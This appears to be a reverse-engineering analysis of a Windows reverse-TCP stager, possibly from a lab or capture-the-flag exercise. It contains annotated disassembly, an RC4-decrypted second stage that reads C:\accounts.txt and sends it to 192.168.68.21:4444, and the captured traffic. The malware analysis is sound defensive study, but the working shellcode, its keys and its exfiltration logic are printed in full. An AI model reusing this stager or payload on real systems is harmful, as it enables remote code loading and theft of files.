+56: 75 f6                   jne    0x4e
+58: 03 7d f8                add    edi,DWORD PTR [ebp-0x8]
+5b: 3b 7d 24                cmp    edi,DWORD PTR [ebp+0x24]
+5e: 75 e4                   jne    0x44
+60: 58                      pop    eax
+61: 8b 58 24                mov    ebx,DWORD PTR [eax+0x24]
+64: 01 d3                   add    ebx,edx
+66: 66 8b 0c 4b             mov    cx,WORD PTR [ebx+ecx*2]
+6a: 8b 58 1c                mov    ebx,DWORD PTR [eax+0x1c]
+6d: 01 d3                   add    ebx,edx
+6f: 8b 04 8b                mov    eax,DWORD PTR [ebx+ecx*4]
+72: 01 d0                   add    eax,edx
+74: 89 44 24 24             mov    DWORD PTR [esp+0x24],eax
+78: 5b                      pop    ebx
+79: 5b                      pop    ebx
+7a: 61                      popa
+7b: 59                      pop    ecx
+7c: 5a                      pop    edx
+7d: 51                      push   ecx
+7e: ff e0                   jmp    eax
+80: 5f                      pop    edi
+81: 5f                      pop    edi
+82: 5a                      pop    edx
+83: 8b 12                   mov    edx,DWORD PTR [edx]
+85: eb 8d                   jmp    0x14
+87: 5d                      pop    ebp
+88: 68 33 32 00 00          push   0x3233      ; Push the bytes 'ws2_32',0,0 onto the stack.
+8d: 68 77 73 32 5f          push   0x5f327377  ;  ...
+92: 54                      push   esp         ; Push a pointer to the "ws2_32" string on the stack.
+93: 68 4c 77 26 07          push   0x726774c    hash( "kernel32.dll", "LoadLibraryA" )
+98: ff d5                   call   ebp         ; LoadLibraryA( "ws2_32" )
+9a: b8 90 01 00 00          mov    eax,0x190   ; EAX = sizeof( struct WSAData )
+9f: 29 c4                   sub    esp,eax     ; alloc some space for the WSAData structure    
+e0: 54                      push   esp         ; ?
+a1: 54                      push   esp         ; push a pointer to this stuct
+a2: 50                      push   eax         ; push the wVersionRequested parameter 
+a3: 68 29 80 6b 00          push   0x6b8029     hash( "ws2_32.dll", "WSAStartup" )
+a8: ff d5                   call   ebp         ;  WSAStartup( 0x0190, &WSAData );
+aa: 50                      push   eax         ; if we succeed, eax wil be zero, push zero for the flags param.
+ab: 50                      push   eax         ; push null for reserved parameter
+ac: 50                      push   eax         ; we do not specify a WSAPROTOCOL_INFO structure
+ad: 50                      push   eax         ; we do not specify a protocol
+ae: 40                      inc    eax         ; 
+af: 50                      push   eax         ;push SOCK_STREAM
+b0: 40                      inc    eax         ;
+b1: 50                      push   eax         ; push AF_INET           
+b2: 68 ea 0f df e0          push   0xe0df0fea    hash( "ws2_32.dll", "WSASocketA" )
+b7: ff d5                   call   ebp         ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
+b9: 97                      xchg   edi,eax     ; save the socket for later, don't care about the value of eax after this
+ba: 6a 05                   push   0x5         ; retry counter
+bc: 68 c0 a8 44 15          push   0x1544a8c0  ; 192.168.68.21
+											   ; push 0x0100007F        ; host 127.0.0.1 ; 68 7F 00 00 01
+
+													// https://www.exploit-db.com/exploits/42339
+													 https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm
+													// sin_port and sin_family (4444, 0x0002)  - https://coffeegist.com/security/slae-exam-5-shellcode-analysis-part-3/
+
+
+c1: 68 02 00 11 5c          push   0x5c110002   ; family AF_INET and port 4444
+c6: 89 e6                   mov    esi,esp      ; save pointer to sockaddr struct
+c8: 6a 10                   push   0x10         ; length of the sockaddr struct
+ca: 56                      push   esi          ; pointer to the sockaddr struct
+cb: 57                      push   edi          ; the socket
+cc: 68 99 a5 74 61          push   0x6174a599   "ws2_32.dll!connect"
+d1: ff d5                   call   ebp          connect( s, &sockaddr, 16 );
+d3: 85 c0                   test   eax,eax      ; non-zero means a failure
+d5: 74 0c                   je     0xe3
+d7: ff 4e 08                dec    DWORD PTR [esi+0x8]
+da: 75 ec                   jne    0xc8
+dc: 68 f0 b5 a2 56          push   0x56a2b5f0    "kernel32.dll!ExitProcess"
+e1: ff d5                   call   ebp        
+e3: 6a 00                   push   0x0            ; flags
+e5: 6a 04                   push   0x4            ; length
+e7: 56                      push   esi            ;  A pointer to the buffer to receive the incoming data.
+e8: 57                      push   edi            ; the saved socket
+e9: 68 02 d9 c8 5f          push   0x5fc8d902     "ws2_32.dll!recv" 
+ee: ff d5                   call   ebp
+f0: 8b 36                   mov    esi,DWORD PTR [esi]
+f2: 81 f6 4b 58 4f 52       xor    esi,0x524f584b
+f8: 8d 0e                   lea    ecx,[esi]
+fa: 6a 40                   push   0x40                  ; flProtect  - PAGE_EXECUTE_READWRITE
+fc: 68 00 10 00 00          push   0x1000                ; flAllocationType - MEM_COMMIT
+101:    51                      push   ecx               ; dwSize
+102:    6a 00                   push   0x0               ;      lpAddress - The starting address of the region to allocate.
+104:    68 58 a4 53 e5          push   0xe553a458        "kernel32.dll!VirtualAlloc"   
+109:    ff d5                   call   ebp
+10b:    8d 98 00 01 00 00       lea    ebx,[eax+0x100]
+111:    53                      push   ebx
+112:    56                      push   esi
+113:    50                      push   eax
+114:    6a 00                   push   0x0               ; flags
+116:    56                      push   esi               ; length
+117:    53                      push   ebx               ;  A pointer to the buffer to receive the incoming data.
+118:    57                      push   edi               ; the saved socket
+119:    68 02 d9 c8 5f          push   0x5fc8d902        "ws2_32.dll!recv"
+11e:    ff d5                   call   ebp
+120:    01 c3                   add    ebx,eax
+122:    29 c6                   sub    esi,eax
+124:    75 ee                   jne    0x114
+126:    5b                      pop    ebx
+127:    59                      pop    ecx
+128:    5d                      pop    ebp
+129:    55                      push   ebp
+12a:    57                      push   edi
+12b:    89 df                   mov    edi,ebx
+12d:    e8 10 00 00 00          call   0x142
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx                  "killervulture123^1"
+132:    6b 69 6c 6c             imul   ebp,DWORD PTR [ecx+0x6c],0x6c
+136:    65 72 76                gs jb  0x1af
+139:    75 6c                   jne    0x1a7
+13b:    74 75                   je     0x1b2
+13d:    72 65                   jb     0x1a4
+13f:    31 32                   xor    DWORD PTR [edx],esi
+141:    33 5e 31                xor    ebx,DWORD PTR [esi+0x31]
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+144:    c0 aa fe c0 75 fb 81    shr    BYTE PTR [edx-0x48a3f02],0x81
+14b:    ef                      out    dx,eax
+14c:    00 01                   add    BYTE PTR [ecx],al
+14e:    00 00                   add    BYTE PTR [eax],al
+150:    31 db                   xor    ebx,ebx
+152:    02 1c 07                add    bl,BYTE PTR [edi+eax*1]
+155:    89 c2                   mov    edx,eax
+157:    80 e2 0f                and    dl,0xf
+15a:    02 1c 16                add    bl,BYTE PTR [esi+edx*1]
+15d:    8a 14 07                mov    dl,BYTE PTR [edi+eax*1]
+160:    86 14 1f                xchg   BYTE PTR [edi+ebx*1],dl
+163:    88 14 07                mov    BYTE PTR [edi+eax*1],dl
+166:    fe c0                   inc    al
+168:    75 e8                   jne    0x152
+16a:    31 db                   xor    ebx,ebx
+16c:    fe c0                   inc    al
+16e:    02 1c 07                add    bl,BYTE PTR [edi+eax*1]
+171:    8a 14 07                mov    dl,BYTE PTR [edi+eax*1]
+174:    86 14 1f                xchg   BYTE PTR [edi+ebx*1],dl
+177:    88 14 07                mov    BYTE PTR [edi+eax*1],dl
+17a:    02 14 1f                add    dl,BYTE PTR [edi+ebx*1]
+17d:    8a 14 17                mov    dl,BYTE PTR [edi+edx*1]
+180:    30 55 00                xor    BYTE PTR [ebp+0x0],dl
+183:    45                      inc    ebp
+184:    49                      dec    ecx
+185:    75 e5                   jne    0x16c
+187:    5f                      pop    edi
+188:    c3                      ret
+189:    51                      push   ecx
+
+===================================================
+
+The call to 0x142 goes to:
+00230142                      | 5E                    | pop esi                          | esi:"%s"
+00230143                      | 31C0                  | xor eax,eax                      |
+00230145                      | AA                    | stosb                            |
+00230146                      | FEC0                  | inc al                           |
+00230148                      | 75 FB                 | jne 230145                       |  ; some loop that builds a memory address (EDI)from 0x0 to 0x100 (256), s
+                                                                                         |  ; so 0x00, 0x01, ... 0xFE, 0xFF, lets call it array1
+0023014A                      | 81EF 00010000         | sub edi,100                      |
+00230150                      | 31DB                  | xor ebx,ebx                      |
+00230152                      | 021C07                | add bl,byte ptr ds:[edi+eax]     |  ; add the number from the array to bl
+00230155                      | 89C2                  | mov edx,eax                      |  
+00230157                      | 80E2 0F               | and dl,F                         | ; reset the counter, like modulo for killervulture123 index
+0023015A                      | 021C16                | add bl,byte ptr ds:[esi+edx]     | ; it runs every time with ds:[esi+edx]: killervulture123
+                                                                                           ; first iteration: bl=0x6B ('k')
+0023015D                      | 8A1407                | mov dl,byte ptr ds:[edi+eax]     | ; move the first number from the array to dl
+00230160                      | 86141F                | xchg byte ptr ds:[edi+ebx],dl    | ; array1[bl]=dl (array1[bl]==0), dl=array1[bl] (dl==6B)
+00230163                      | 881407                | mov byte ptr ds:[edi+eax],dl     | ; array1[eax] = dl 
+00230166                      | FEC0                  | inc al                           |
+00230168                      | 75 E8                 | jne 230152                       |
+0023016A                      | 31DB                  | xor ebx,ebx                      |
+0023016C                      | FEC0                  | inc al                           |
+0023016E                      | 021C07                | add bl,byte ptr ds:[edi+eax]     |
+00230171                      | 8A1407                | mov dl,byte ptr ds:[edi+eax]     |
+00230174                      | 86141F                | xchg byte ptr ds:[edi+ebx],dl    |
+00230177                      | 881407                | mov byte ptr ds:[edi+eax],dl     |
+0023017A                      | 02141F                | add dl,byte ptr ds:[edi+ebx]     |
+0023017D                      | 8A1417                | mov dl,byte ptr ds:[edi+edx]     |
+00230180                      | 3055 00               | xor byte ptr ss:[ebp],dl         |
+00230183                      | 45                    | inc ebp                          |
+00230184                      | 49                    | dec ecx                          |
+00230185                      | 75 E5                 | jne 23016C                       |
+00230187                      | 5F                    | pop edi                          |
+00230188                      | C3                    | ret                              |
+
+See the array after the two loops:
+00B90000  99 98 CA A9 E1 0A 77 A1 33 D4 4E D5 F4 47 DE 8A  ..Ê©á.w¡3ÔNÕôGÞ.  
+00B90010  83 EB CB 46 0D F8 EC 23 27 F7 67 75 6B 6F 3D 9D  .ëËF.øì#'÷guko=.  
+00B90020  26 F3 1E 20 B7 86 BB 6D 2C 3F 29 9C 10 E7 C5 2E  &ó. ·.»m,?)..çÅ.  
+00B90030  74 5E DB A3 A0 18 8C 2A C0 5C 22 21 E0 0E CD 6E  t^Û£ ..*À\"!à.Ín  
+00B90040  B9 02 2F FE 4B 30 D3 C9 25 51 1D 89 16 A8 4C 81  ¹./þK0ÓÉ%Q...¨L.  
+00B90050  C2 AA 7D 91 5F 71 1A 52 F2 35 13 9E 38 09 DD A4  Âª}._q.Rò5..8.Ý¤  
+00B90060  7F 0F FF 48 CF 93 C7 D7 1F B2 EA 65 A7 C1 36 07  ..ÿHÏ.Ç×.²êe§Á6.  
+00B90070  76 31 B0 B6 39 44 45 87 06 72 7C 42 84 CE 5D B1  v1°¶9DE..r|B.Î]±  
+00B90080  63 19 AE D6 8E 79 15 6A F6 AC 00 EE BF 4A 03 BE  c.®Ö.y.jö¬.î¿J.¾  
+00B90090  E9 78 E8 73 08 E6 95 E2 66 EF F1 7A BC 0C AD FA  éxès.æ.âfïñz¼..ú  
+00B900A0  12 70 8D 80 92 4D 7B 17 60 D8 E3 5B 49 DF 1C 97  .p...M{.`Øã[Iß..  
+00B900B0  3E C3 D9 54 2B 0B A2 96 B8 8F 90 50 F5 28 E5 55  >ÃÙT+.¢.¸..Põ(åU  
+00B900C0  ED 9A 6C CC 82 E4 D0 FC 3A 9B 58 24 37 3C 41 62  í.lÌ.äÐü:.X$7<Ab  
+00B900D0  8B 56 40 C6 43 B3 A6 FB DA B4 9F 04 B5 2D 69 5A  .V@ÆC³¦ûÚ´..µ-iZ  
+00B900E0  34 AB D1 F0 61 1B C8 88 DC 7E BD 64 A5 F9 D2 4F  4«Ñða.È.Ü~½d¥ùÒO  
+00B900F0  32 14 94 68 3B 11 53 BA 85 01 57 FD 59 C4 05 AF  2..h;.Sº..WýYÄ.¯  
+00B90100  8B EC 8D 64 24 EC E8 00 00 00 00 58 8D 40 F5 89  .ì.d$ìè....X.@õ.  
+00B90110  45 F8 8B 45 F8 8D 80 6D 04 00 00 89 45 EC 8B 45  Eø.Eø..m....Eì.E  
+00B90120  F8 8D 80 79 04 00 00 89 45 F0 6A 00 8F 45 F4 8B  ø..y....Eðj..Eô.  
+00B90130  45 F8 8D 80 8D 04 00 00 8D 18 8D 75 EC EB 12 E8  Eø.........uìë.è  
+00B90140  4B 03 00 00 50 8B 45 F8 8D 88 6D 04 00 00 FF 51  K...P.Eø..m...ÿQ  
+00B90150  04 8B 06 83 F8 00 74 E7 8B C3 83 C3 04 8B 00 89  ....ø.tç.Ã.Ã....  
+00B90160  45 FC 33 FF 8B 0B 8B 45 FC 8B D1 E8 81 01 00 00  Eü3ÿ...Eü.Ñè....  
+00B90170  8B D0 83 FA 00 74 02 EB 05 83 C6 04 EB D3 8B 06  .Ð.ú.t.ë..Æ.ëÓ..  
+00B90180  8B CF 83 C7 01 8D 04 88 89 10 83 C3 04 EB D5 53  .Ï.Ç.......Ã.ëÕS  
+00B90190  56 57 55 8B EC 8D 64 24 F4 89 45 F8 8B FA 89 4D  VWU.ì.d$ô.Eø.ú.M  
+00B901A0  FC 33 DB 8B 45 FC 3B D8 72 02 EB 23 8B F7 03 F3  ü3Û.Eü;Ør.ë#.÷.ó  
+00B901B0  8B C7 03 C3 8A 00 88 45 F4 8B 45 F8 E8 AA 00 00  .Ç.Ã...Eô.Eøèª..  
+00B901C0  00 8A C8 8A 45 F4 32 C1 88 06 83 C3 01 EB D4 C9  ..È.Eô2Á...Ã.ëÔÉ  
+00B901D0  5F 5E 5B C3 53 56 57 55 8B EC 8D 64 24 F8 8B D8  _^[ÃSVWU.ì.d$ø.Ø  
+00B901E0  89 55 FC 8B F9 33 C9 81 F9 00 01 00 00 72 02 EB  .Uü.ù3É.ù....r.ë  
+00B901F0  0F 8B C3 8B D0 03 D1 8B C1 88 02 83 C1 01 EB E7  ..Ã.Ð.Ñ.Á...Á.ëç  
+00B90200  33 F6 33 C9 81 F9 00 01 00 00 72 02 EB 4A 33 D2  3ö3É.ù....r.ëJ3Ò  
+00B90210  8B C1 F7 F7 8B 45 FC 03 C2 8A 00 0F B6 C0 03 F0  .Á÷÷.Eü.Â...¶À.ð  
+00B90220  8B C3 03 C1 8A 00 0F B6 C0 03 F0 81 E6 FF 00 00  .Ã.Á...¶À.ð.æÿ..  
+00B90230  00 8B C3 03 C1 8A 00 88 45 F8 8B C3 8B D0 03 D1  ..Ã.Á...Eø.Ã.Ð.Ñ  
+00B90240  8B C3 03 C6 8A 00 88 02 8B C3 8B D0 03 D6 8A 45  .Ã.Æ.....Ã.Ð.Ö.E  
+00B90250  F8 88 02 83 C1 01 EB AC C6 83 00 01 00 00 00 C6  ø...Á.ë¬Æ......Æ  
+00B90260  83 01 01 00 00 00 C9 5F 5E 5B C3 53 56 57 55 8B  ......É_^[ÃSVWU.  
+00B90270  EC 8D 64 24 FC 8B D0 8A 8A 00 01 00 00 8A 9A 01  ì.d$ü.Ð.........  
+00B90280  01 00 00 80 C1 01 8B C2 0F B6 F1 03 C6 8A 00 02  ....Á..Â.¶ñ.Æ...  
+00B90290  D8 88 8A 00 01 00 00 88 9A 01 01 00 00 8B C2 0F  Ø.............Â.  
+00B902A0  B6 F3 03 C6 8A 00 88 45 FD 8B C2 8B F0 0F B6 C3  ¶ó.Æ...Eý.Â.ð.¶Ã  
+00B902B0  03 F0 8B C2 0F B6 F9 03 C7 8A 00 88 45 FC 8A 45  .ð.Â.¶ù.Ç...Eü.E  
+00B902C0  FC 88 06 8B C2 8B F0 0F B6 C1 03 F0 8A 45 FD 88  ü...Â.ð.¶Á.ð.Eý.  
+00B902D0  06 8B C2 8D 30 8D 02 0F B6 CB 03 C1 8A 08 8A 45  ..Â.0...¶Ë.Á...E  
+00B902E0  FD 02 C1 24 FF 0F B6 C0 03 F0 8A 06 C9 5F 5E 5B  ý.Á$ÿ.¶À.ð..É_^[  
+00B902F0  C3 53 56 57 55 8B EC 8D 64 24 F0 89 45 F8 89 55  ÃSVWU.ì.d$ð.Eø.U  
+00B90300  FC 64 A1 30 00 00 00 8B 40 0C 8B 48 0C 8B 41 18  üd¡0....@..H..A.  
+00B90310  83 F8 00 74 0D EB 04 8B 09 EB F2 33 D2 66 33 DB  .ø.t.ë...ëò3Òf3Û  
+00B90320  EB 07 33 C0 C9 5F 5E 5B C3 66 8B 41 2C 66 3B D8  ë.3ÀÉ_^[Ãf.A,f;Ø  
+00B90330  72 08 EB 26 66 83 C3 02 EB EF 8B F2 C1 EE 0D C1  r.ë&f.Ã.ëï.òÁî.Á  
+00B90340  E2 13 0B F2 8B D6 8B 41 30 0F B7 F3 03 C6 8A 00  â..ò.Ö.A0.·ó.Æ..  
+00B90350  0F BE C0 83 F8 61 72 12 EB 09 8B 45 F8 3B C2 74  .¾À.øar.ë..Eø;Ât  
+00B90360  0D EB B4 83 E8 20 03 D0 EB CA 03 D0 EB C6 8B 59  .ë´.è .ÐëÊ.ÐëÆ.Y  
+00B90370  18 8B 43 3C 8B D3 03 D0 8B 42 78 8B D3 03 D0 8B  ..C<.Ó.Ð.Bx.Ó.Ð.  
+00B90380  C2 89 45 F4 33 D2 8B 45 F4 8B 40 18 3B D0 72 07  Â.Eô3Ò.Eô.@.;Ðr.  
+00B90390  EB 85 83 C2 01 EB EF 8B 45 F4 8B 40 20 8B F3 03  ë..Â.ëï.Eô.@ .ó.  
+00B903A0  F0 8B C6 8D 04 90 8B 00 8B FB 03 F8 33 F6 8B C7  ð.Æ......û.ø3ö.Ç  
+00B903B0  83 C7 01 8A 00 0F BE C0 89 45 F0 8B 45 F0 83 F8  .Ç....¾À.Eð.Eð.ø  
+00B903C0  00 74 02 EB 09 8B 45 FC 3B C6 74 15 EB C4 8B C6  .t.ë..Eü;Æt.ëÄ.Æ  
+00B903D0  C1 E8 0D C1 E6 13 0B C6 8B F0 8B 45 F0 03 F0 EB  Áè.Áæ..Æ.ð.Eð.ðë  
+00B903E0  CD 8B 45 F4 8B 40 1C 8B CB 03 C8 8B 45 F4 8B 40  Í.Eô.@..Ë.È.Eô.@  
+00B903F0  24 8B F3 03 F0 8B C6 8D 04 50 66 8B 00 0F B7 C0  $.ó.ð.Æ..Pf...·À  
+00B90400  8D 04 81 8B 00 03 D8 8B C3 C9 5F 5E 5B C3 53 56  ......Ø.ÃÉ_^[ÃSV  
+00B90410  57 55 8B EC 8D 64 24 E8 89 45 F8 89 55 FC E8 00  WU.ì.d$è.Eø.Uüè.  
+00B90420  00 00 00 5E 8D B6 DD FC FF FF 6A 06 6A 01 6A 02  ...^.¶Ýüÿÿj.j.j.  
+00B90430  8D 86 79 04 00 00 FF 50 10 8B D8 83 FB 00 7C 02  ..y...ÿP..Ø.û.|.  
+00B90440  EB 07 8B C3 C9 5F 5E 5B C3 8D 7D E8 32 C0 6A 10  ë..ÃÉ_^[Ã.}è2Àj.  
+00B90450  59 F3 AA 66 C7 45 E8 02 00 8B 45 FC 66 C1 C0 08  YóªfÇEè...EüfÁÀ.  
+00B90460  66 89 45 EA 8B 45 F8 0F C8 89 45 EC 8D 45 E8 6A  f.Eê.Eø.È.Eì.Eèj  
+00B90470  10 50 53 8D 86 79 04 00 00 FF 50 04 83 F8 00 7C  .PS..y...ÿP..ø.|  
+00B90480  02 EB 05 C9 5F 5E 5B C3 8B C3 C9 5F 5E 5B C3 53  .ë.É_^[Ã.ÃÉ_^[ÃS  
+00B90490  56 57 55 8B EC 8D A4 24 68 FC FF FF E8 00 00 00  VWU.ì.¤$hüÿÿè...  
+00B904A0  00 5E 8D B6 5F FC FF FF 8D 86 B9 04 00 00 6A 00  .^.¶_üÿÿ..¹...j.  
+00B904B0  6A 00 6A 03 6A 00 6A 01 68 00 00 00 80 50 8D 86  j.j.j.j.h....P..  
+00B904C0  6D 04 00 00 FF 10 8B D0 8D 8D 68 FC FF FF 8D 85  m...ÿ..Ð..hüÿÿ..  
+00B904D0  68 FD FF FF 6A 00 50 68 00 01 00 00 51 52 8D 86  hýÿÿj.Ph....QR..  
+00B904E0  6D 04 00 00 FF 50 08 8D 86 C9 04 00 00 8D 10 8D  m...ÿP...É......  
+00B904F0  9D 6C FD FF FF 8B FA 32 C0 33 C9 49 F2 AE F7 D1  .lýÿÿ.ú2À3ÉIò®÷Ñ  
+00B90500  49 8B C3 E8 CC FC FF FF 8D 85 6C FD FF FF 8D 95  I.ÃèÌüÿÿ..lýÿÿ..  
+00B90510  68 FC FF FF 8B 8D 68 FD FF FF E8 70 FC FF FF 8D  hüÿÿ..hýÿÿèpüÿÿ.  
+00B90520  85 70 FE FF FF 50 68 02 02 00 00 8D 86 79 04 00  .pþÿÿPh......y..  
+00B90530  00 FF 10 B8 15 44 A8 C0 66 BA 39 05 E8 CD FE FF  .ÿ.¸.D¨Àfº9.èÍþÿ  
+00B90540  FF 8B D8 8D 85 68 FC FF FF 6A 00 FF B5 68 FD FF  ÿ.Ø..hüÿÿj.ÿµhýÿ  
+00B90550  FF 50 53 8D 86 79 04 00 00 FF 50 08 6A 02 53 8D  ÿPS..y...ÿP.j.S.  
+00B90560  86 79 04 00 00 FF 50 0C C9 5F 5E 5B C3 00 00 00  .y...ÿP.É_^[Ã...  
+00B90570  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................  
+00B90580  00 00 00 00 00 00 00 00 00 00 00 00 00 17 CA 2B  ..............Ê+  
+00B90590  6E A5 17 00 7C 7E D8 E2 73 16 65 FA 10 A6 EF E1  n¥..|~Øâs.eú.¦ïá  
+00B905A0  32 CB ED FC 3B EC F9 AA 60 A4 19 70 E9 C9 6A 5F  2Ëíü;ìùª`¤.péÉj_  
+00B905B0  4D 6E 0B 2F 49 00 00 00 00 43 3A 5C 61 63 63 6F  Mn./I....C:\acco  
+00B905C0  75 6E 74 73 2E 74 78 74 00 69 6E 74 72 65 70 69  unts.txt.intrepi  
+00B905D0  64 6D 61 6E 67 6F 00 00 00 00 00 00 00 00 00 00  dmango..........  
+
+
+
+
+After the imports of the functions there is the follwing calls:  
+;HANDLE CreateFileA(
+;  LPCSTR                lpFileName,
+;  DWORD                 dwDesiredAccess,
+;  DWORD                 dwShareMode,
+;  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
+;  DWORD                 dwCreationDisposition,
+;  DWORD                 dwFlagsAndAttributes,
+;  HANDLE                hTemplateFile
+;);
+
+008004AE                      | 6A 00                 | push 0                           |  ; hTemplateFile
+008004B0                      | 6A 00                 | push 0                           |  ; dwFlagsAndAttributes
+008004B2                      | 6A 03                 | push 3                           |  ; dwCreationDisposition = OPEN_EXISTING,  Opens a file or device, only if it exists.
+008004B4                      | 6A 00                 | push 0                           |  ; lpSecurityAttributes
+008004B6                      | 6A 01                 | push 1                           |  ; dwShareMode = FILE_SHARE_READ, Enables subsequent open operations on a file or device to request read access.
+008004B8                      | 68 00000080           | push 80000000                    |  ; dwDesiredAccess = GENERIC_READ 
+008004BD                      | 50                    | push eax                         |  ; lpFileName = C:\accounts.txt
+008004BE                      | 8D86 6D040000         | lea eax,dword ptr ds:[esi+46D]   |
+008004C4                      | FF10                  | call dword ptr ds:[eax]          |  ; CreateFileA
+008004C6                      | 8BD0                  | mov edx,eax                      |  ; handle saved in eax and moved to edx
+CreateFileA("c:\accounts.txt",GENERIC_READ ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0)
+
+
+;BOOL ReadFile(
+;  HANDLE       hFile,
+;  LPVOID       lpBuffer,
+;  DWORD        nNumberOfBytesToRead,
+;  LPDWORD      lpNumberOfBytesRead,
+;  LPOVERLAPPED lpOverlapped
+;);
+
+008004D4                      | 6A 00                 | push 0                           | ; lpOverlapped
+008004D6                      | 50                    | push eax                         | ; lpNumberOfBytesRead A pointer to the variable that receives the number of bytes read when using a synchronous hFile parameter
+008004D7                      | 68 00010000           | push 100                         | ; nNumberOfBytesToRead - The maximum number of bytes to be read.
+008004DC                      | 51                    | push ecx                         | ; lpBuffer A pointer to the buffer that receives the data read from a file or device.
+008004DD                      | 52                    | push edx                         | ; hFile
+008004DE                      | 8D86 6D040000         | lea eax,dword ptr ds:[esi+46D]   | ; 
+008004E4                      | FF50 08               | call dword ptr ds:[eax+8]        | ; ReadFile
+008004E7                      | 8D86 C9040000         | lea eax,dword ptr ds:[esi+4C9]   | esi+4C9:"intrepidmango"
+
+ReadFile(hFile, lpBuffer, 100, lpNumberOfBytesRead, 0)
+
+
+69 6E 74 72 65 70 69 64 6D 61 6E 67 6F
+
+
+58 67 5a cb a8 67 96 76 8c b4 1a 0d b7  XgZ..g.v.....
+b'XgZ\xcb\xa8g\x96v\x8c\xb4\x1a\r\xb7'
+
+
+
+0000   00 0c 29 53 25 34 00 0c 29 50 92 ec 08 00 45 00   ..)S%4..)P....E.
+0010   00 f6 58 cd 40 00 80 06 00 00 c0 a8 44 01 c0 a8   ..X.@.......D...
+0020   44 15 0b 6f 05 39 65 0e e1 09 53 5d 6f 32 50 18   D..o.9e...S]o2P.
+0030   fa f0 0a 50 00 00 43 66 57 83 a5 23 89 77 be ac   ...P..CfW..#.w..
+0040   1b 1f 87 8f 58 93 3f 24 cf 2c d3 9a a8 d1 11 c4   ....X.?$.,......
+0050   bc a6 7f cd 38 db b3 3c 03 4b ab f5 60 c5 60 d2   ....8..<.K..`.`.
+0060   0d 1d 18 88 41 5b 4f 06 17 6c 9e 0b 01 73 9d 83   ....A[O..l...s..
+0070   60 18 fa 8b ff f8 4d 78 b2 a4 24 6f ae bd 92 d1   `.....Mx..$o....
+0080   ec cc 2d 7c 8b bf d0 8c bd e2 45 ef 15 b2 88 bc   ..-|......E.....
+0090   a4 59 be 20 ac f9 57 df 10 ba bc d9 11 93 41 19   .Y. ..W.......A.
+00a0   00 9c 02 25 ef c4 4a 26 fd 25 ca 9b 85 19 64 4e   ...%..J&.%....dN
+00b0   c5 84 9f a1 00 18 2c 68 30 dc 70 4c fe 83 f1 c7   ......,h0.pL....
+00c0   00 2b 49 7a 83 09 05 77 6e 0a 08 8d 56 e4 38 7e   .+Iz...wn...V.8~
+00d0   88 0f 2c 41 e4 33 66 c9 bc 06 aa 2a a1 96 2d 94   ..,A.3f....*..-.
+00e0   c0 08 16 1e a4 f2 81 1a 83 f7 7c b5 7d 63 13 00   ..........|.}c..
+00f0   41 96 ca 69 80 ae 49 e9 5d 0f 7d 89 43 d4 89 1a   A..i..I.].}.C...
+0100   01 b4 61 61                                       ..aa
+
+
+data = [0x43, 0x66, 0x57, 0x83, 0xa5, 0x23, 0x89, 0x77, 0xbe, 0xac, 0x1b, 0x1f, 0x87, 0x8f, 0x58, 0x93, 0x3f, 0x24, 0xcf, 0x2c, 0xd3, 0x9a, 0xa8, 0xd1, 0x11, 0xc4, 0xbc, 0xa6, 0x7f, 0xcd, 0x38, 0xdb, 0xb3, 0x3c, 0x03, 0x4b, 0xab, 0xf5, 0x60, 0xc5, 0x60, 0xd2, 0x0d, 0x1d, 0x18, 0x88, 0x41, 0x5b, 0x4f, 0x06, 0x17, 0x6c, 0x9e, 0x0b, 0x01, 0x73, 0x9d, 0x83, 0x60, 0x18, 0xfa, 0x8b, 0xff, 0xf8, 0x4d, 0x78, 0xb2, 0xa4, 0x24, 0x6f, 0xae, 0xbd, 0x92, 0xd1, 0xec, 0xcc, 0x2d, 0x7c, 0x8b, 0xbf, 0xd0, 0x8c, 0xbd, 0xe2, 0x45, 0xef, 0x15, 0xb2, 0x88, 0xbc, 0xa4, 0x59, 0xbe, 0x20, 0xac, 0xf9, 0x57, 0xdf, 0x10, 0xba, 0xbc, 0xd9, 0x11, 0x93, 0x41, 0x19, 0x00, 0x9c, 0x02, 0x25, 0xef, 0xc4, 0x4a, 0x26, 0xfd, 0x25, 0xca, 0x9b, 0x85, 0x19, 0x64, 0x4e, 0xc5, 0x84, 0x9f, 0xa1, 0x00, 0x18, 0x2c, 0x68, 0x30, 0xdc, 0x70, 0x4c, 0xfe, 0x83, 0xf1, 0xc7, 0x00, 0x2b, 0x49, 0x7a, 0x83, 0x09, 0x05, 0x77, 0x6e, 0x0a, 0x08, 0x8d, 0x56, 0xe4, 0x38, 0x7e, 0x88, 0x0f, 0x2c, 0x41, 0xe4, 0x33, 0x66, 0xc9, 0xbc, 0x06, 0xaa, 0x2a, 0xa1, 0x96, 0x2d, 0x94, 0xc0, 0x08, 0x16, 0x1e, 0xa4, 0xf2, 0x81, 0x1a, 0x83, 0xf7, 0x7c, 0xb5, 0x7d, 0x63, 0x13, 0x00, 0x41, 0x96, 0xca, 0x69, 0x80, 0xae, 0x49, 0xe9, 0x5d, 0x0f, 0x7d, 0x89, 0x43, 0xd4, 0x89, 0x1a, 0x01, 0xb4, 0x61, 0x61]
+
